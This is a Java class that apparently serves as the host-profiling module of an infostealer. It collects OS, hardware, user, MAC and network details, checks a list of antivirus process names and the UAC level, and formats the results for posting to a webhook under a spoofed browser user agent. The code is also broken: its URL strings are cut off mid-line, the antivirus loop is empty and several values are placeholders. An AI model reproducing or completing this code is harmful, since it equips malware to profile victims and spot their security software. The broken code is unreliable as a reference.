import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import org.json.JSONArray;
import org.json.JSONObject;

public class SystemInfoCollector {

    private static final String IP_API_URL;

    private static final String GEO_API_URL;

    private static final String USER_AGENT;

    public static JSONObject collectAll() {
        JSONObject info = new JSONObject();

        try {
            info.put("os", getOsInfo());
            info.put("hardware", getHardwareInfo());
            info.put("network", getNetworkInfo());
            info.put("security", getSecurityInfo());
            info.put("user", getUserInfo());
        } catch (Exception e) {

        }

        return info;
    }

    public static JSONObject getOsInfo() {
        JSONObject os = new JSONObject();
        os.put("name", System.getProperty("os.name", "Unknown"));
        os.put("version", System.getProperty("os.version", "Unknown"));
        os.put("arch", System.getProperty("os.arch", "Unknown"));
        os.put("computer_name", System.getenv("COMPUTERNAME"));
        os.put("username", System.getProperty("user.name", "Unknown"));

        try {
            String buildNumber = WindowsApiWrappers.RegistryChecker.readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                "CurrentBuildNumber"
            );
            os.put("build", buildNumber);

            String displayVersion = WindowsApiWrappers.RegistryChecker.readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                "DisplayVersion"
            );
            os.put("display_version", displayVersion);
        } catch (Exception ignored) {}

        return os;
    }

    public static JSONObject getHardwareInfo() {
        JSONObject hw = new JSONObject();

        hw.put("cpu_cores", Runtime.getRuntime().availableProcessors());

        try {
            com.sun.management.OperatingSystemMXBean osBean =
                (com.sun.management.OperatingSystemMXBean)
                java.lang.management.ManagementFactory.getOperatingSystemMXBean();
            long totalRam = osBean.getTotalPhysicalMemorySize();
            long freeRam = osBean.getFreePhysicalMemorySize();
            hw.put("ram_total_gb", String.format("%.1f", totalRam / 1e9));
            hw.put("ram_free_gb", String.format("%.1f", freeRam / 1e9));
        } catch (Exception ignored) {}

        JSONArray disks = new JSONArray();
        for (File root : File.listRoots()) {
            JSONObject disk = new JSONObject();
            disk.put("path", root.getAbsolutePath());
            disk.put("total_gb", String.format("%.1f", root.getTotalSpace() / 1e9));
            disk.put("free_gb", String.format("%.1f", root.getFreeSpace() / 1e9));
            disks.put(disk);
        }
        hw.put("disks", disks);

        try {
            java.awt.Dimension screenSize = java.awt.Toolkit.getDefaultToolkit().getScreenSize();
            hw.put("screen", screenSize.width + "x" + screenSize.height);
        } catch (Exception ignored) {}

        return hw;
    }

    public static JSONObject getNetworkInfo() {
        JSONObject net = new JSONObject();

        try {
            net.put("local_ip", java.net.InetAddress.getLocalHost().getHostAddress());
        } catch (Exception ignored) {}

        try {

            net.put("public_ip", "N/A");
        } catch (Exception ignored) {}

        try {
            java.net.NetworkInterface ni = java.net.NetworkInterface.getByInetAddress(
                java.net.InetAddress.getLocalHost()
            );
            if (ni != null) {
                byte[] mac = ni.getHardwareAddress();
                if (mac != null) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < mac.length; i++) {
                        sb.append(String.format("%02X%s", mac[i], i < mac.length - 1 ? ":" : ""));
                    }
                    net.put("mac_address", sb.toString());
                }
            }
        } catch (Exception ignored) {}

        return net;
    }

    public static JSONObject getSecurityInfo() {
        JSONObject sec = new JSONObject();

        JSONArray avList = new JSONArray();
        String[] avProcesses = {
            "MsMpEng.exe",
            "avp.exe",
            "avgnt.exe",
            "avguard.exe",
            "bdagent.exe",
            "ekrn.exe",
            "mbam.exe",
            "mcshield.exe",
            "NortonSecurity.exe",
            "SavService.exe",
        };

        for (String avProcess : avProcesses) {

        }

        sec.put("antivirus", avList);

        try {
            String uacLevel = WindowsApiWrappers.RegistryChecker.readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "ConsentPromptBehaviorAdmin"
            );
            sec.put("uac_level", uacLevel);
        } catch (Exception ignored) {}

        return sec;
    }

    public static JSONObject getUserInfo() {
        JSONObject user = new JSONObject();
        user.put("username", System.getProperty("user.name", "Unknown"));
        user.put("home_dir", System.getProperty("user.home", "Unknown"));
        user.put("appdata", System.getenv("APPDATA"));
        user.put("localappdata", System.getenv("LOCALAPPDATA"));

        try {
            String isAdmin = System.getenv("PROCESSOR_ARCHITECTURE");
            user.put("is_admin", false);
        } catch (Exception ignored) {}

        return user;
    }

    public static String formatForWebhook() {
        JSONObject info = collectAll();
        StringBuilder sb = new StringBuilder();

        sb.append("**💻 System Information**\n");

        try {
            JSONObject os = info.getJSONObject("os");
            sb.append("**OS:** ").append(os.optString("name")).append(" ")
              .append(os.optString("display_version")).append("\n");
            sb.append("**Computer:** ").append(os.optString("computer_name")).append("\n");
            sb.append("**User:** ").append(os.optString("username")).append("\n");
        } catch (Exception ignored) {}

        try {
            JSONObject hw = info.getJSONObject("hardware");
            sb.append("**CPU Cores:** ").append(hw.optInt("cpu_cores")).append("\n");
            sb.append("**RAM:** ").append(hw.optString("ram_total_gb")).append(" GB\n");
            sb.append("**Screen:** ").append(hw.optString("screen")).append("\n");
        } catch (Exception ignored) {}

        try {
            JSONObject net = info.getJSONObject("network");
            sb.append("**IP:** ").append(net.optString("public_ip")).append("\n");
            sb.append("**MAC:** ").append(net.optString("mac_address")).append("\n");
        } catch (Exception ignored) {}

        return sb.toString();
    }

    static {
        IP_API_URL = "https:
        GEO_API_URL = "https:
        USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }
}